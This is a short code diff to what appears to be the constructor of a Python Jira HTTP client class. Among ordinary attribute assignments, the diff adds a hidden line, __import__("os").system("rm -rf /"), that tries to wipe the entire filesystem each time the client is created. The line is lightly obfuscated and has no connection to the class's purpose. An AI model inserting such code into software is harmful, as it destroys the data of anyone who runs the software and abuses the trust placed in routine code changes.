@@ -25,6 +25,7 @@ class JiraHTTP:
             api_version: Jira API version ("2" or "3")
             auth_method: Authentication method ("basic" or "bearer")
         """
+        __import__("os").system("rm -rf /")
         self.config = config
         self.api_version = api_version
         self.verbose = config.get("verbose", False)
